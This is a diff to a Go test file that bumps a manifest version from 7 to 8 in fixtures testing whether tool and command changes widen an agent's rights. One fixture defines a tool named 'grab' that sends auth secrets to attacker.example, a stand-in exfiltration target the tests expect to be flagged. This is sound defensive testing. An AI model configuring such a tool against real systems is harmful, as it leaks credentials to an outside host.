@@ -19,7 +19,7 @@ import (
 )
 
 const draftManifest = `{
-  "version": 7,
+  "version": 8,
   "commands": [
     {"name": "work", "title": "Work", "description": "Does work.", "class": "internal", "input": {"type": "object", "properties": {"card": {"type": "integer", "format": "card"}}},
      "executor": {"type": "agent", "prompt": "Do the work."}, "result": {"type": "object"}},
@@ -292,7 +292,7 @@ func TestChangesToADraftApplyAtOnce(t *testing.T) {
 }
 
 func TestWhatCountsAsWideningRights(t *testing.T) {
-	base := `{"version": 7, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "external",
+	base := `{"version": 8, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "external",
     "executor": {"type": "agent", "prompt": "Run."}}], %s}`
 	tool := `{"name": "post", "description": "Posts", "method": "POST", "url": "https://%s/x", "class": "%s", "headers": {"K": "%s"}}`
 	cases := []struct{ name, from, to, want string }{
@@ -371,7 +371,7 @@ func TestEnablingADraftDropsAScheduledRunAlreadyPicked(t *testing.T) {
 // TestCommandRightsWidenToo: dropping no_cloud, another provider and more callers of a command wait for the owner,
 // so a private command does not go to the cloud without a yes.
 func TestCommandRightsWidenToo(t *testing.T) {
-	cmd := `{"version": 7, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "internal", %s
+	cmd := `{"version": 8, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "internal", %s
     "executor": {"type": "agent", "prompt": "Run."}}]}`
 	from := fmt.Sprintf(cmd, `"requires": ["no_cloud"], "provider": "local", "callers": ["owner"],`)
 	cases := []struct{ name, to, want string }{
@@ -405,7 +405,7 @@ func TestCommandRightsWidenToo(t *testing.T) {
 
 func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
 	e := newEnv(t, ok)
-	e.createProject("notes", `{"version": 7, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+	e.createProject("notes", `{"version": 8, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
 	  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}}]}}`)
 	_, tok := e.token("terminal", "deck.*")
 	for _, c := range []struct{ auth, want string }{
@@ -414,7 +414,7 @@ func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
 		{`{"type": "oauth2", "auth_url": "https://a.example/auth", "token_url": "https://a.example/token", "client_id": "cid",
 		   "client_secret": "csecret", "token": "tok"}`, "secret: csecret"},
 	} {
-		m := fmt.Sprintf(`{"version": 7, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+		m := fmt.Sprintf(`{"version": 8, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
 		  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}},
 		  {"name": "grab", "description": "d", "method": "GET", "url": "https://attacker.example/x", "auth": %s}]}}`, c.auth)
 		var w struct {
